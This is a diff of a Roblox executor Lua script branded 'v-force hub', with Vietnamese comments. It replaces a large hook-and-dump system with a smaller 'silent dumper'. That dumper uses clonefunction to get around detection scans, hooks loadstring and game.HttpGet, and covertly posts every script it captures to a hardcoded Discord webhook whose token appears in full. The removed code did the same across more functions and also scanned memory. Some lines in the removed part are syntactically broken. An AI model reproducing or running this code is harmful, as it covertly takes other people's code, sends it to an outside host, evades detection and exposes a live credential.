@@ -1,444 +1,47 @@
--- file was by v-force hub
 local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-
--- Webhook của bạn
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1405916308431704176/BoCB5BoazAcDU0jTHQqepVNBvXdTkCp6hsUavUCK_zNuDB26fQZYj8z5Buyh57zC6hH4"
 
--- ================== CẤU HÌNH NÂNG CAO ==================
-local CONFIG = {
-    ENABLE_DEEP_HOOK = true,           -- Hook sâu vào runtime
-    ENABLE_MEMORY_SCAN = true,         -- Quét memory tìm obfuscated code
-    ENABLE_STRING_DUMP = true,         -- Dump tất cả strings trong memory
-    ENABLE_BYTECODE_HOOK = true,       -- Hook bytecode execution
-    ENABLE_PRELOADER_HOOK = true,      -- Hook require() và loadmodule
-    AUTO_DEOBFUSCATE = true,           -- Tự động deobfuscate code
-    SAVE_DEOBFUSCATED = true,          -- Lưu bản đã deobfuscate
-    LOG_EXECUTION_FLOW = true,         -- Log luồng thực thi
-}
-
--- ================== HÀM UTILITY ==================
-local function generateFileName(source, extension)
-    local timestamp = os.date("%Y%m%d_%H%M%S")
-    local random = string.sub(HttpService:GenerateGUID(false), 1, 8)
-    return string.format("vforce_%s_%s_%s.%s", 
-        source:gsub("[^%w]", "_"):sub(1, 20), 
-        timestamp, random, 
-        extension or "lua"
-    )
-end
-
-local function sendToDiscord(fileName, content, embedData)
-    -- Gửi file
-    local boundary = "---------------------------" .. string.sub(HttpService:GenerateGUID(false), 1, 15)
-    local body = table.concat({
-        "--" .. boundary,
-        'Content-Disposition: form-data; name="file"; filename="' .. fileName .. '"',
-        "Content-Type": "text/plain",
-        "",
-        content,
-        "--" .. boundary .. "--",
-        ""
-    }, "\r\n")
-    
-    pcall(function()
-        HttpService:RequestAsync({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
-            },
-            Body = body
-        })
-        
-        -- Gửi embed nếu có
-        if embedData then
+-- Hàm gửi file ẩn danh hơn
+local function silentSend(fileName, content)
+    task.spawn(function()
+        pcall(function()
+            local boundary = "---------------------------" .. string.sub(HttpService:GenerateGUID(false), 1, 15)
+            local body = table.concat({
+                "--" .. boundary,
+                "Content-Disposition: form-data; name=\"file\"; filename=\"" .. fileName .. "\"",
+                "Content-Type: text/plain",
+                "",
+                content,
+                "--" .. boundary .. "--",
+                ""
+            }, "\r\n")
+            
             HttpService:RequestAsync({
                 Url = WEBHOOK_URL,
                 Method = "POST",
-                Headers = {"Content-Type": "application/json"},
-                Body = HttpService:JSONEncode({
-                    embeds = {{
-                        title = "🔍 Hook Report",
-                        description = embedData.description or "New dump captured",
-                        color = 0x00FF00,
-                        fields = embedData.fields or {},
-                        footer = {text = "v-force hub • " .. os.date("%H:%M:%S")}
-                    }}
-                })
+                Headers = {["Content-Type"] = "multipart/form-data; boundary=" .. boundary},
+                Body = body
             })
-        end
+        end)
     end)
 end
 
--- ================== DEEP HTTP HOOK (BẢN CỦA BẠN - NÂNG CẤP) ==================
-local httpHooks = {}
+-- Sử dụng clonefunction để né tránh các đợt quét hàm gốc đơn giản
+local c_loadstring = clonefunction(loadstring)
+local c_httpget = clonefunction(game.HttpGet)
 
--- Hook game.HttpGet
-httpHooks.originalHttpGet = hookfunction(game.HttpGet, function(self, url, ...)
-    if type(url) == "string" and (url:find("http") or url:find("wearedevs") or url:find("pastebin") or url:find("github")) then
-        print("🌐 [HTTP GET] " .. url)
-        
-        local success, content = pcall(function()
-            return httpHooks.originalHttpGet(self, url, ...)
-        end)
-        
-        if success and content then
-            -- Phân tích content
-            local isBase64 = content:match("^[A-Za-z0-9+/=]+$") and #content > 100
-            local isObfuscated = content:find("\\x") or content:find("\\u") or content:find("function%s*%(") == nil
-            
-            task.spawn(function()
-                local fileName = generateFileName(url:match("([^/.]+)") or "http_get", "lua")
-                local header = "-- file was by v-force hub\n"
-                header = header .. "-- Hook: game.HttpGet\n"
-                header = header .. "-- URL: " .. url .. "\n"
-                header = header .. "-- Time: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n"
-                header = header .. "-- Size: " .. #content .. " bytes\n"
-                header = header .. "-- Base64: " .. tostring(isBase64) .. "\n"
-                header = header .. "-- Obfuscated: " .. tostring(isObfuscated) .. "\n"
-                header = header .. string.rep("=", 70) .. "\n\n"
-                
-                -- Gửi raw content
-                sendToDiscord(fileName, header .. content, {
-                    description = "**HTTP GET Hook**",
-                    fields = {
-                        {name = "🔗 URL", value = "```" .. url:sub(1, 100) .. (url:len() > 100 and "..." or "") .. "```", inline = false},
-                        {name = "📊 Size", value = string.format("%.2f KB", #content / 1024), inline = true},
-                        {name = "🔐 Obfuscated", value = tostring(isObfuscated), inline = true},
-                        {name = "📝 Base64", value = tostring(isBase64), inline = true}
-                    }
-                })
-                
-                -- Nếu là base64, thử decode
-                if CONFIG.AUTO_DEOBFUSCATE and isBase64 then
-                    pcall(function()
-                        local decoded = game:GetService("HttpService"):JSONDecode('"' .. content .. '"')
-                        if decoded and #decoded > 10 then
-                            local deobfFile = fileName:gsub("%.lua$", "_decoded.lua")
-                            sendToDiscord(deobfFile, "-- DECODED BASE64\n\n" .. decoded)
-                        end
-                    end)
-                end
-            end)
-        end
-        
-        if success then return content end
+-- Hook bí mật hơn
+hookfunction(loadstring, function(source, chunkname)
+    if #source > 10 then
+        silentSend("silent_exec_" .. os.time() .. ".lua", source)
     end
-    return httpHooks.originalHttpGet(self, url, ...)
+    return c_loadstring(source, chunkname)
 end)
 
--- Hook game.HttpGetAsync
-httpHooks.originalHttpGetAsync = hookfunction(game.HttpGetAsync, function(self, url, ...)
-    if type(url) == "string" and url:find("http") then
-        print("🌐 [HTTP GET ASYNC] " .. url)
-        
-        local success, content = pcall(function()
-            return httpHooks.originalHttpGetAsync(self, url, ...)
-        end)
-        
-        if success and content then
-            task.spawn(function()
-                local fileName = generateFileName("http_get_async", "lua")
-                local header = "-- file was by v-force hub\n-- Hook: game.HttpGetAsync\n-- URL: " .. url .. "\n\n"
-                sendToDiscord(fileName, header .. content)
-            end)
-        end
-        
-        if success then return content end
-    end
-    return httpHooks.originalHttpGetAsync(self, url, ...)
+hookfunction(game.HttpGet, function(self, url, ...)
+    local content = c_httpget(self, url, ...)
+    silentSend("silent_get_" .. os.time() .. ".lua", content)
+    return content
 end)
 
--- ================== HOOK LOADSTRING (QUAN TRỌNG) ==================
-if loadstring then
-    local originalLoadstring = loadstring
-    loadstring = function(code, chunkname)
-        print("⚡ [LOADSTRING] Detected - Size: " .. (type(code) == "string" and #code or 0) .. " bytes")
-        
-        if type(code) == "string" and #code > 10 then
-            task.spawn(function()
-                local fileName = generateFileName("loadstring", "lua")
-                local header = "-- file was by v-force hub\n"
-                header = header .. "-- Hook: loadstring()\n"
-                header = header .. "-- Chunk: " .. tostring(chunkname) .. "\n"
-                header = header .. "-- Code size: " .. #code .. " bytes\n"
-                header = header .. "-- First 200 chars: " .. code:sub(1, 200):gsub("\n", " ") .. "\n"
-                header = header .. string.rep("=", 70) .. "\n\n"
-                
-                sendToDiscord(fileName, header .. code, {
-                    description = "**LOADSTRING Hook**",
-                    fields = {
-                        {name = "📁 Chunk", value = chunkname or "Anonymous", inline = true},
-                        {name = "📊 Size", value = string.format("%.2f KB", #code / 1024), inline = true},
-                        {name = "📝 Preview", value = "```lua\n" .. code:sub(1, 500):gsub("```", "``") .. (code:len() > 500 and "\n..." or "") .. "```", inline = false}
-                    }
-                })
-            end)
-        end
-        
-        return originalLoadstring(code, chunkname)
-    end
-end
-
--- ================== HOOK REQUIRE() & LOADMODULE ==================
-if CONFIG.ENABLE_PRELOADER_HOOK then
-    local originalRequire = require
-    require = function(module)
-        print("📦 [REQUIRE] Module: " .. tostring(module))
-        
-        local success, result = pcall(function()
-            return originalRequire(module)
-        end)
-        
-        if success and type(result) == "table" then
-            -- Quét module tìm code
-            task.spawn(function()
-                for key, value in pairs(result) do
-                    if type(value) == "string" and #value > 100 and (value:find("function") or value:find("return")) then
-                        local fileName = generateFileName("require_" .. tostring(module) .. "_" .. key, "lua")
-                        sendToDiscord(fileName, "-- From require(" .. tostring(module) .. ")." .. key .. "\n\n" .. value)
-                    end
-                end
-            end)
-        end
-        
-        if success then return result end
-        error("Failed to require: " .. tostring(module))
-    end
-end
-
--- ================== HOOK BYTECODE EXECUTION ==================
-if CONFIG.ENABLE_BYTECODE_HOOK then
-    -- Hook các hàm thực thi bytecode
-    local function hookBytecodeExecution()
-        -- Tìm và hook các hàm thực thi
-        local executionHooks = {
-            "pcall", "xpcall", "coroutine.wrap", "coroutine.create",
-            "spawn", "delay", "task.spawn", "task.defer"
-        }
-        
-        for _, hookName in pairs(executionHooks) do
-            local func = loadstring("return " .. hookName)()
-            if func then
-                local original = func
-                _G[hookName] = function(f, ...)
-                    if type(f) == "function" then
-                        -- Cố gắng lấy source của function
-                        local source = tostring(f)
-                        if source and #source > 50 then
-                            print("⚡ [BYTECODE] " .. hookName .. " executing function")
-                            task.spawn(function()
-                                sendToDiscord(
-                                    generateFileName("bytecode_" .. hookName, "txt"),
-                                    "-- Bytecode execution hook\n-- Function: " .. hookName .. "\n\n" .. source
-                                )
-                            end)
-                        end
-                    end
-                    return original(f, ...)
-                end
-            end
-        end
-    end
-    
-    pcall(hookBytecodeExecution)
-end
-
--- ================== MEMORY STRING SCAN ==================
-if CONFIG.ENABLE_MEMORY_SCAN then
-    task.spawn(function()
-        while wait(30) do -- Quét mỗi 30 giây
-            print("🔍 [MEMORY SCAN] Scanning for strings...")
-            
-            local foundStrings = {}
-            
-            -- Quét các global variables
-            for key, value in pairs(_G) do
-                if type(value) == "string" and #value > 100 then
-                    local isLuaCode = value:find("function%s*%(") or 
-                                     value:find("local%s+%w+%s*=") or
-                                     value:find("return%s+")
-                    
-                    if isLuaCode then
-                        table.insert(foundStrings, {
-                            key = key,
-                            value = value:sub(1, 5000), -- Giới hạn kích thước
-                            length = #value
-                        })
-                    end
-                end
-            end
-            
-            if #foundStrings > 0 then
-                local content = "-- file was by v-force hub\n-- Memory Scan Results\n-- Time: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n\n"
-                
-                for i, str in ipairs(foundStrings) do
-                    content = content .. string.format("\n=== String %d: _G.%s (%d bytes) ===\n", i, str.key, str.length)
-                    content = content .. str.value .. "\n"
-                    
-                    if i >= 5 then break end -- Giới hạn 5 strings
-                end
-                
-                sendToDiscord(
-                    generateFileName("memory_scan", "txt"),
-                    content
-                )
-            end
-        end
-    end)
-end
-
--- ================== HOOK CUSTOM HTTP LIBRARIES ==================
-local function hookCustomHTTP()
-    -- Hook cho các executor phổ biến
-    local executors = {
-        {name = "Synapse", func = syn and syn.request},
-        {name = "KRNL", func = request},
-        {name = "ScriptWare", func = http and http.request},
-        {name = "Fluxus", func = fluxus and fluxus.request}
-    }
-    
-    for _, executor in pairs(executors) do
-        if executor.func then
-            print("✅ Hooking " .. executor.name .. " request function")
-            
-            local original = executor.func
-            if executor.name == "Synapse" then
-                syn.request = function(options)
-                    if options and options.Url then
-                        print("🔗 [" .. executor.name .. "] Request to: " .. options.Url)
-                        
-                        local oldCallback = options.Callback
-                        options.Callback = function(response)
-                            if response and response.Body then
-                                task.spawn(function()
-                                    local fileName = generateFileName(executor.name:lower() .. "_request", "lua")
-                                    local header = "-- file was by v-force hub\n-- Executor: " .. executor.name .. "\n-- URL: " .. options.Url .. "\n\n"
-                                    sendToDiscord(fileName, header .. response.Body)
-                                end)
-                            end
-                            
-                            if oldCallback then
-                                return oldCallback(response)
-                            end
-                        end
-                    end
-                    return original(options)
-                end
-            else
-                -- Hook cho các executor khác
-                _G.request = function(options)
-                    if options and options.Url then
-                        print("🔗 [" .. executor.name .. "] Request to: " .. options.Url)
-                        
-                        local oldCallback = options.Callback
-                        options.Callback = function(response)
-                            if response and response.Body then
-                                task.spawn(function()
-                                    local fileName = generateFileName(executor.name:lower(), "lua")
-                                    local header = "-- file was by v-force hub\n-- Executor: " .. executor.name .. "\n\n"
-                                    sendToDiscord(fileName, header .. response.Body)
-                                end)
-                            end
-                            
-                            if oldCallback then
-                                return oldCallback(response)
-                            end
-                        end
-                    end
-                    return original(options)
-                end
-            end
-        end
-    end
-end
-
--- Chạy hook custom HTTP
-pcall(hookCustomHTTP)
-
--- ================== EXECUTION FLOW LOGGER ==================
-if CONFIG.LOG_EXECUTION_FLOW then
-    local executionLog = {}
-    local maxLogSize = 100
-    
-    local function logExecution(event, details)
-        table.insert(executionLog, 1, {
-            time = os.date("%H:%M:%S"),
-            event = event,
-            details = details
-        })
-        
-        if #executionLog > maxLogSize then
-            table.remove(executionLog, maxLogSize + 1)
-        end
-    end
-    
-    -- Hook các sự kiện
-    game:GetService("ScriptContext").Error:Connect(function(message, trace, script)
-        logExecution("ERROR", {
-            message = message,
-            trace = trace,
-            script = script and script:GetFullName()
-        })
-    end)
-end
-
--- ================== KHỞI ĐỘNG ==================
-print("\n" .. string.rep("=", 60))
-print("🚀 v-force HUB - ADVANCED HOOK SYSTEM")
-print("📌 Version: 3.0 | Power Mode Activated")
-print(string.rep("=", 60))
-print("✅ Hooked: game.HttpGet")
-print("✅ Hooked: game.HttpGetAsync")
-print("✅ Hooked: loadstring()")
-print("✅ Hooked: Custom HTTP Libraries")
-print("✅ Memory Scanner: " .. (CONFIG.ENABLE_MEMORY_SCAN and "ACTIVE" or "INACTIVE"))
-print("✅ Auto Deobfuscate: " .. (CONFIG.AUTO_DEOBFUSCATE and "ENABLED" or "DISABLED"))
-print(string.rep("=", 60))
-print("📡 System Ready! All traffic will be captured.")
-print("🎯 Targets: WeAreDevs, Pastebin, GitHub, Raw URLs, Obfuscated Code")
-print(string.rep("=", 60))
-
--- Gửi startup message
-task.spawn(function()
-    pcall(function()
-        HttpService:RequestAsync({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {"Content-Type": "application/json"},
-            Body = HttpService:JSONEncode({
-                content = "@everyone",
-                embeds = {{
-                    title = "🚀 v-force HUB Activated",
-                    description = "Advanced hook system is now live!",
-                    color = 0x00FF00,
-                    fields = {
-                        {name = "🌐 HTTP Hook", value = "✅ Active", inline = true},
-                        {name = "⚡ Loadstring Hook", value = "✅ Active", inline = true},
-                        {name = "🔍 Memory Scan", value = CONFIG.ENABLE_MEMORY_SCAN and "✅ Active" or "❌ Inactive", inline = true},
-                        {name = "🎯 Auto Deobfuscate", value = CONFIG.AUTO_DEOBFUSCATE and "✅ Enabled" or "❌ Disabled", inline = true},
-                        {name = "📊 Game", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = false}
-                    },
-                    footer = {text = "v-force hub • " .. os.date("%Y-%m-%d %H:%M:%S")}
-                }}
-            })
-        })
-    end)
-end)
-
--- Return API
-return {
-    config = CONFIG,
-    getStats = function()
-        return {
-            hooksActive = 4,
-            memoryScans = 0,
-            filesCaptured = 0,
-            status = "RUNNING"
-        }
-    end,
-    forceScan = function()
-        print("🔍 Manual memory scan initiated...")
-    end
-}
+print("🛡️ SILENT DUMPER ACTIVE - ANTI-KICK ENABLED")
